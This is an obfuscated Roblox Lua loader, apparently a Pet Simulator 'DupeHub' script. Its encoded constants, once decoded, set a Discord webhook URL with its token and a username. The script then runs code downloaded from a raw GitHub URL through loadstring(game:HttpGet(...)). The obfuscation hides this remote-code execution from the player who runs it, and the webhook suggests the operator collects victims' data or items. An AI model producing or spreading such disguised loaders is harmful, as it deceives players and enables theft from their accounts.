--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.2) ~  Much Love, Ferib 

]]--

do local v0=0;local v1;local v2;local v3;local v4;local v5;local v6;local v7;local v8;local v9;local v10;local v11;local v12;local v13;local v14;local v15;local v16;while true do if (v0==3) then v10=getfenv or function()return _ENV;end;v11=setmetatable;v12=pcall;v0=4;end if (v0==1) then v4=string.sub;v5=string.gsub;v6=string.rep;v0=2;end if (v0==0) then v1=tonumber;v2=string.byte;v3=string.char;v0=1;end if (v0==2) then v7=table.concat;v8=table.insert;v9=math.ldexp;v0=3;end if (v0==4) then v13=select;v14=unpack or table.unpack;v15=tonumber;v0=5;end if (v0==5) then v16=nil;v16=function(v25,v26,...)local v27=1;local v28;v25=v5(v4(v25,5),"..",function(v29)if (v2(v29,2)==79) then v28=v1(v4(v29,1,1));return "";else local v83=v3(v1(v29,16));if v28 then local v87=0;local v88;while true do if (1==v87) then return v88;end if (v87==0) then v88=v6(v83,v28);v28=nil;v87=1;end end else return v83;end end end);local function v30(v31,v32,v33)if v33 then local v84=(v31/((2 + 0)^(v32-(1 -0))))%((2 + 0)^(((v33-(1 + (0 -0))) -(v32-1)) + 1 + 0 + 0));return v84-(v84%((851 -508) -(153 + 189)));else local v85=904 -(348 + 556);local v86;while true do if ((1624 -(1321 + 303))==v85) then v86=((5 + 0) -3)^(v32-(2 -1));return (((v31%(v86 + v86))>=v86) and (1 -0)) or 0;end end end end local function v34()local v47=0 -0;local v48;while true do if (v47==(1 + (0 -0))) then return v48;end if (v47==(0 -0)) then v48=v2(v25,v27,v27);v27=v27 + 1 + 0;v47=1;end end end local function v35()local v49,v50=v2(v25,v27,v27 + 1 + 1);v27=v27 + (282 -(229 + 51));return (v50 * (547 -(114 + 177))) + v49;end local function v36()local v51=0 + (1889 -(184 + 1705));local v52;local v53;local v54;local v55;while true do if (v51==(0 + 0)) then v52,v53,v54,v55=v2(v25,v27,v27 + 3);v27=v27 + 1 + 3;v51=(6 -4) -1;end if (v51==(3 -2)) then return (v55 * 16777216) + (v54 * (61858 + 3678)) + (v53 * (247 + 9)) + v52;end end end local function v37()local v56=v36();local v57=v36();local v58=1;local v59=(v30(v57,1316 -(786 + 529),68 -48) * ((117 -(71 + 44))^32)) + v56;local v60=v30(v57,1132 -(800 + 311),15 + 16);local v61=((v30(v57,21 + 11)==1) and  -(717 -(86 + 630))) or (540 -((1546 -(817 + 422)) + 232));if (v60==(197 -(40 + 157))) then if (v59==(0 -0)) then return v61 * (0 -0);else local v89=1555 -((219 -63) + 1399);while true do if (v89==0) then v60=1280 -((2749 -1752) + 282);v58=0 -0;break;end end end elseif (v60==(8325 -6278)) then return ((v59==(0 + 0)) and (v61 * ((841 -(606 + 234))/(0 -0)))) or (v61 * NaN);end return v9(v61,v60-(672 + 351)) * (v58 + (v59/((4 -2)^(38 + 14))));end local function v38(v39)local v62=0 + 0;local v63;local v64;while true do if (v62==(8 -(699 -(620 + 74)))) then return v7(v64);end if (v62==((12 -5) -5)) then v64={};for v90=(284 + 908) -(236 + 955), #v63 do v64[v90]=v3(v2(v4(v63,v90,v90)));end v62=1131 -(341 + 787);end if (v62==0) then v63=nil;if  not v39 then v39=v36();if (v39==(0 -0)) then return "";end end v62=1 + 0;end if (v62==(357 -(65 + 291))) then v63=v4(v25,v27,(v27 + v39) -(1184 -(1079 + 104)));v27=v27 + v39;v62=2 + 0;end end end local v40=v36;local function v41(...)return {...},v13("#",...);end local function v42()local v65=0 + 0;local v66;local v67;local v68;local v69;local v70;local v71;local v72;local v73;while true do if (v65==3) then v72=nil;v73=nil;v65=3 + 1;end if (2==v65) then v70=nil;v71=nil;v65=3;end if (v65==0) then v66=673 -(603 + 70);v67=nil;v65=472 -(338 + 133);end if (v65==(3 -2)) then v68=nil;v69=nil;v65=2;end if (v65==4) then while true do if (v66==2) then v71=nil;v72=nil;v66=3;end if (1==v66) then local v102=0 -0;local v103;while true do if (v102==0) then v103=0;while true do if (v103==1) then v66=4 -2;break;end if (v103==(0 + 0)) then v69=nil;v70=nil;v103=3 -2;end end break;end end end if (v66==(88 -(11 + 74))) then v73=nil;while true do local v110=0 -0;local v111;local v112;while true do if (v110==(0 + 0)) then v111=0 -0;v112=nil;v110=1 + 0;end if ((4 -3)==v110) then while true do if (v111==(1656 -(1598 + 58))) then v112=0;while true do if (v112==0) then local v121=0 -0;local v122;while true do if (v121~=(0 -0)) then else v122=0 -0;while true do if ((1 + 0)==v122) then v112=1;break;end if (v122~=0) then else local v151=0;while true do if ((672 -(444 + 228))==v151) then if (v67~=3) then else local v168=0 + 0;local v169;while true do if (v168~=0) then else v169=0;while true do local v174=0 + 0;while true do if (0~=v174) then else if (v169==(681 -(590 + 91))) then local v187=0;local v188;while true do if (v187~=(0 + 0)) then else v188=0 -0;while true do if (v188==1) then v169=1 -0;break;end if (v188==(0 + 0)) then for v197=1,v36() do v69[v197-(2 -1)]=v42();end for v199=1,v36() do v70[v199]=v36();end v188=1;end end break;end end end if (v169==(1 + 0)) then return v71;end break;end end end break;end end end if (v67==2) then local v170=0;while true do if (v170~=0) then else local v173=0 + 0;while true do if (v173~=(0 -0)) then else for v182=1,v72 do local v183=0;local v184;local v185;local v186;while true do if (v183~=0) then else v184=364 -(260 + 104);v185=nil;v183=2 -1;end if (v183==(3 -2)) then v186=nil;while true do if (v184==0) then local v195=1730 -(195 + 1535);while true do if (v195==1) then v184=1 -0;break;end if (v195==(1782 -(158 + 1624))) then v185=v34();v186=nil;v195=2 -1;end end end if (v184==(78 -(34 + 43))) then if (v185==(1687 -(1172 + 514))) then v186=v34()~=0;elseif (v185==(6 -4)) then v186=v37();elseif (v185==3) then v186=v38();end v73[v182]=v186;break;end end break;end end end v71[3]=v34();v173=1;end if (1==v173) then v170=1476 -(316 + 1159);break;end end end if (v170==1) then for v175=1620 -(1204 + 415),v36() do local v176=0 + 0;local v177;local v178;while true do if (v176==0) then v177=0 -0;v178=nil;v176=1917 -(1426 + 490);end if (v176~=(1 + 0)) then else while true do if (v177==(0 -0)) then v178=v34();if (v30(v178,1,1)~=0) then else local v189=0;local v190;local v191;local v192;local v193;local v194;while true do if (v189~=(141 -(123 + 18))) then else v190=0;v191=nil;v189=1;end if (v189==(472 -(368 + 102))) then v194=nil;while true do if (v190==2) then while true do if (v191~=2) then else local v203=0;while true do if (v203==1) then v191=10 -7;break;end if (v203==0) then if (v30(v193,3 -2,1)~=(1 + 0)) then else v194[2 + 0]=v73[v194[3 -1]];end if (v30(v193,2,325 -(301 + 22))==(1 -0)) then v194[3 + 0]=v73[v194[8 -5]];end v203=1;end end end if (v191~=1) then else local v204=0;while true do if (v204~=0) then else local v211=0;while true do if (0~=v211) then else local v216=0;while true do if (v216==(1 + 0)) then v211=1;break;end if (v216~=(0 + 0)) then else v194={v35(),v35(),nil,nil};if (v192==0) then local v217=0;local v218;while true do if (v217~=(0 -0)) then else v218=0 + 0;while true do if (v218==(0 -0)) then v194[3]=v35();v194[4 + 0]=v35();break;end end break;end end elseif (v192==(180 -(122 + 57))) then v194[3]=v36();elseif (v192==(2 + 0)) then v194[3]=v36() -((1 + 1)^(41 -25));elseif (v192==(2 + 1)) then local v223=0 -0;local v224;local v225;local v226;while true do if (v223==1) then v226=nil;while true do if (v224~=(0 + 0)) then else v225=0;v226=nil;v224=75 -(12 + 62);end if (v224==1) then while true do if (v225==(1345 -(589 + 756))) then v226=0;while true do if (v226==(0 + 0)) then v194[3]=v36() -((6 -4)^(26 -10));v194[2 + 2]=v35();break;end end break;end end break;end end break;end if (v223~=(1662 -(1326 + 336))) then else v224=0;v225=nil;v223=1082 -(733 + 348);end end end v216=1379 -(1323 + 55);end end end if (v211~=1) then else v204=3 -2;break;end end end if (v204==(1 -0)) then v191=2;break;end end end if (v191==0) then local v205=0;local v206;local v207;while true do if (v205~=0) then else v206=0;v207=nil;v205=2 -1;end if (v205==(1508 -(162 + 1345))) then while true do if ((1802 -(680 + 1122))~=v206) then else v207=0 -0;while true do if (v207==(0 + 0)) then v192=v30(v178,6 -4,457 -(304 + 150));v193=v30(v178,4,6);v207=903 -(217 + 685);end if (v207==1) then v191=2 -1;break;end end break;end end break;end end end if (v191~=3) then else if (v30(v193,3,3)==1) then v194[4]=v73[v194[4]];end v68[v175]=v194;break;end end break;end if (v190==(0 -0)) then local v201=0;while true do if (v201~=0) then else v191=0;v192=nil;v201=1 -0;end if ((901 -(804 + 96))~=v201) then else v190=1;break;end end end if ((1 -0)==v190) then local v202=0;while true do if (v202==0) then v193=nil;v194=nil;v202=1050 -(373 + 676);end if (v202==(1 + 0)) then v190=2;break;end end end end break;end if (v189==(1 -0)) then v192=nil;v193=nil;v189=1653 -(567 + 1084);end end end break;end end break;end end end v67=3 + 0;break;end end end v151=514 -(174 + 339);end if (v151==(1 + 0)) then v122=1;break;end end end end break;end end end if ((3 -2)~=v112) then else if (v67~=(2 -1)) then else local v123=0 -0;local v124;while true do if (v123==0) then v124=625 -(342 + 283);while true do if (1~=v124) then else v73={};v67=6 -4;break;end if (v124==(1591 -(968 + 623))) then local v155=0 + 0;local v156;while true do if (v155~=(690 -(334 + 356))) then else v156=0;while true do if (v156~=(3 -2)) then else v124=1267 -(805 + 461);break;end if (v156==(0 + 0)) then v71={v68,v69,nil,v70};v72=v36();v156=1;end end break;end end end end break;end end end if (v67~=(0 -0)) then else local v125=0 + 0;while true do if (v125~=(0 + 0)) then else local v149=0;local v150;while true do if (v149==0) then v150=0 + 0;while true do if (1==v150) then v125=1;break;end if (v150~=0) then else v68={};v69={};v150=1;end end break;end end end if (v125==(1 + 0)) then v70={};v67=1;break;end end end break;end end break;end end break;end end end break;end if (v66==(1671 -(927 + 744))) then local v104=0;while true do if ((1006 -(840 + 166))==v104) then local v117=0;while true do if (v117==0) then v67=0 -0;v68=nil;v117=1;end if (v117==1) then v104=1;break;end end end if (v104~=1) then else v66=3 -2;break;end end end end break;end end end local function v43(v44,v45,v46)local v74=v44[1];local v75=v44[2];local v76=v44[3];return function(...)local v77=0;local v78;local v79;local v80;local v81;local v82;while true do if (v77==2) then v82=nil;v82=function()local v92=v74;local v93=v75;local v94=v76;local v95=v41;local v96={};local v97={};local v98={};for v105=173 -(68 + 105),v81 do if (((5643 -(601 + 474))>=(330 + 1696)) and (v105>=v94)) then v96[v105-v94]=v80[v105 + (1 -0)];else v98[v105]=v80[v105 + (2 -1)];end end local v99=(v81-v94) + (88 -((13 -3) + 77));local v100;local v101;while true do local v106=0 -0;local v107;while true do if ((v106==(0 -0)) or ((19028 -14129)==(1225 + 2001))) then v107=(0 + 0) -0;while true do if ((v107==(1 + 0)) or ((12013 -8010)<=(3099 -(179 + 191)))) then if ((((2066 + 5443) -(77 + 2574))>((14257 -(1756 + 165)) -8015)) and (v101<=(13 -(31 -23)))) then if ((v101<=((20 -13) -5)) or ((1019 + 1521)>=(3283 + 536))) then if (((12517 -8981)<(3293 + 756)) and (v101<=(15 -(6 + 9)))) then local v126=(337 -(162 + 175)) + 0;local v127;local v128;while true do if (((5573 -(107 + 229 + 451))>((72 + 16325) -(13501 -(216 + 1079)))) and (v126==((2112 -1271) -(65 + (2465 -1690))))) then while true do if (((3642 -(265 + 600 + 716))>(1841 -(34 + 125))) and (v127==(888 -(518 + 370)))) then v128=v100[1442 -((1138 -(50 + 641)) + 993)];v98[v128]=v98[v128](v14(v98,v128 + (1 -(0 -0)),v79));break;end end break;end if (((311 + 409 + 3057)==3777) and (v126==(0 -0))) then v127=1459 -(1353 + 106);v128=nil;v126=1 + 0;end end elseif ((v101==(1 + 0)) or (((2634 + 49) -1309)<(298 -190))) then if ((v100[1223 -(721 + 500)]==v98[v100[4]]) or ((6188 -(186 + 1341))<=((11751 -6507) -(227 + 401)))) then v78=v78 + (2 -1);else v78=v100[(4297 -2939) -(439 + 916)];end elseif (((4566 -(201 + (287 -211)))>=(1429 -((1295 -765) + 36 + 3))) and (v98[v100[2 + 0]]==v100[1943 -((1847 -695) + 787)])) then v78=v78 + (1021 -((919 -(188 + 50)) + (950 -611)));else v78=v100[939 -(671 + 265)];end elseif ((v101<=(3 + 0)) or ((522 + 195 + 453)>(664 + 984 + 3020))) then v98[v100[2 -0]]=v100[3];elseif (((1537 + (1630 -1255))>=(164 + 262)) and (v101==(11 -7))) then v98[v100[4 -2]]();else do return;end end elseif ((v101<=(1 + 3 + 4)) or ((6941 -2027)<=(13458 -10723))) then if (((87 + 361)<(325 + 1587)) and (v101<=(2 + 0 + 4))) then for v131=v100[1303 -(207 + 1094)],v100[(2 + 2) -1] do v98[v131]=nil;end elseif (((3856 + 574)>(758 + 3195)) and (v101==(290 -(258 + 25)))) then v98[v100[1 + 1]]=v46[v100[9 -6]];else v46[v100[1 + 2]]=v98[v100[3 -1]];end elseif ((v101<=(19 -(16 -7))) or ((11350 -6978)<=((4789 -(170 + 913)) -(563 + 1321)))) then if ((v101>9) or (((442 + 1601) -(264 + 400))>=(9613 -7203))) then v78=v100[356 -(336 + 17)];else local v138=0;local v139;local v140;local v141;while true do if ((((8073 -(534 + 1136)) -(94 + 1548))==(1286 + 2864 + 611)) and (v138==(282 -(91 + 190)))) then v141=nil;while true do if (((4530 -2107)>=(1098 -235)) and (v139==(1 + 0))) then v98[v140 + (583 -(251 + 331))]=v141;v98[v140]=v141[v100[1839 -((2034 -1379) + (2432 -(362 + 890)))]];break;end if ((v139==(1638 -(566 + 1072))) or ((2161 + 849)>(2855 + 506))) then local v166=895 -(647 + 248);while true do if ((v166==(1892 -(1478 + 414))) or (((408 -228) + 19)>=(718 -(266 + 30)))) then v140=v100[(6 + 2) -6];v141=v98[v100[4 -1]];v166=(1770 -(609 + 1159)) -1;end if (((6257 -(653 + 1144))>(1312 + 2170)) and (v166==(1157 -(223 + 933)))) then v139=1408 -((5758 -4550) + 199);break;end end end end break;end if ((717<=4185) and (v138==(0 -(0 + 0)))) then v139=1084 -(727 + 357);v140=nil;v138=2 -1;end end end elseif (((451 + 223)<=(3141 -965)) and (v101==((1452 -(201 + 1244)) + 4))) then v98[v100[2 + 0]][v100[142 -(89 + 50)]]=v100[13 -9];else local v144=901 -(656 + 245);local v145;local v146;local v147;local v148;while true do if (((216 + 3616)==(11044 -7212)) and (v144==(0 -0))) then local v154=(0 -0) + 0;while true do if (((266 + 311)<(6445 -(3482 -(321 + 6)))) and (v154==(1 + 0 + 0))) then v144=1 -(0 + 0);break;end if ((v154==(1471 -((2263 -1094) + 302))) or (((1629 -(467 + 913)) + 116)>=(3514 + 925))) then v145=v100[28 -(15 + 11)];v146,v147=v95(v98[v145](v14(v98,v145 + 1 + 0,v100[9 -6])));v154=3 -2;end end end if ((v144==(1327 -(154 + 1171))) or ((4069 -2013)>=(4598 -(369 + 332)))) then for v159=v145,v79 do local v160=0 + 0;local v161;local v162;while true do if ((v160==(863 -((1584 -(114 + 699)) + 91))) or (1452>((12241 -7799) -(111 + 1117)))) then while true do if ((v161==(0 + 0)) or (((667 + 1026) -(44 + 787))>=((75 + 2721) -((591 -(320 + 208)) + 553)))) then v162=0;while true do if (((0 -(0 + 0))==v162) or ((1278 + 1906)<(2307 + 53))) then v148=v148 + 1;v98[v159]=v146[v148];break;end end break;end end break;end if (((52 + 4063)==((2923 -(121 + 719)) + 2032)) and (v160==(0 -0))) then v161=1636 -(477 + 1159);v162=nil;v160=1 + 0 + 0;end end end break;end if ((v144==((2011 -893) -(561 + 556))) or (((6600 -5173) -1063)>(2155 + 382))) then v79=(v147 + v145) -(1 + (0 -0));v148=(1992 -(147 + 1845)) + 0;v144=990 -((2102 -(1200 + 559)) + 645);end end end v78=v78 + (574 -(139 + 434));break;end if ((((4606 -(998 + 179)) -(243 + 12 + 134))>=(5994 -3307)) and (v107==(0 -0))) then local v118=0 + 0;while true do if ((v118==(0 -0)) or ((2508 -(262 + 760))>(5411 -((129 -61) + 787)))) then v100=v92[v78];v101=v100[3 -2];v118=1 + 0;end if (((924 -(1266 -739))<(1337 -(10 + 289))) and ((1 + 0 + 0)==v118)) then v107=(870 -189) -((366 -(9 + 43)) + 366);break;end end end end break;end end end end;v77=3;end if (v77==3) then A,B=v41(v12(v82));if  not A[1] then local v108=0;local v109;while true do if (0==v108) then v109=v44[4][v78] or "?";error("Script error at ["   .. v109   .. "]:"   .. A[2]);break;end end else return v14(A,2,B);end break;end if (1==v77) then v80={...};v81=v13("#",...) -1;v77=2;end if (v77==0) then v78=1;v79= -1;v77=1;end end end;end return v43(v42(),{},v26)(...);end;v16("LOL!173O00028O00026O00F03F027O004003023O005F4703103O00437573746F6D5363726970744E616D6503073O004475706548756203053O00546578743103103O00536372697074204C6F616465643O2E03083O00557365726E616D6503073O004C78766570696303073O00576562482O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F313037313736382O39353133383634313937312F7844365539595F634E773870416F76526C6939796D796730446857324543455648775F73624E5345686E4F597755497868704B6744326C767974344554576355686C2O36026O00084003053O00546578743203123O0057616974696E6720666F722053637269707403053O00546578743303133O00436865636B696E6720536372697074733O2E03053O00546578743403133O005374617274696E6720536372697074733O2E030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574034F3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F4A757374616E6F74686572646D652F70657473696D782O322F6D61696E2F70657473696D6775692O732E6C756100423O0012033O00014O0006000100013O0026023O00020001000100040A3O00020001001203000100013O002602000100140001000200040A3O00140001001203000200013O000E010002000C0001000200040A3O000C0001001203000100033O00040A3O00140001002602000200080001000100040A3O00080001001207000300043O00300B000300050006001207000300043O00300B000300070008001203000200023O00040A3O00080001002602000100230001000100040A3O00230001001203000200013O0026020002001E0001000100040A3O001E00010012030003000A3O001208000300093O0012030003000C3O0012080003000B3O001203000200023O002602000200170001000200040A3O00170001001203000100023O00040A3O0023000100040A3O00170001002602000100320001000300040A3O00320001001203000200013O0026020002002A0001000200040A3O002A00010012030001000D3O00040A3O00320001002602000200260001000100040A3O00260001001207000300043O00300B0003000E000F001207000300043O00300B000300100011001203000200023O00040A3O00260001002602000100050001000D00040A3O00050001001207000200043O00300B000200120013001207000200143O001207000300153O002009000300030016001203000500174O000C000300056O00023O00022O000400020001000100040A3O0041000100040A3O0005000100040A3O0041000100040A3O000200012O00053O00017O00423O00023O00033O00053O00053O00063O00083O00083O00093O000B3O000B3O000C3O000D3O000F3O000F3O00103O00103O00113O00113O00123O00133O00163O00163O00173O00193O00193O001A3O001A3O001B3O001B3O001C3O001E3O001E3O001F3O00203O00213O00243O00243O00253O00273O00273O00283O00293O002B3O002B3O002C3O002C3O002D3O002D3O002E3O002F3O00323O00323O00333O00333O00343O00343O00343O00343O00343O00343O00343O00353O00363O00383O00393O003B3O00",v10(),...);break;end end end
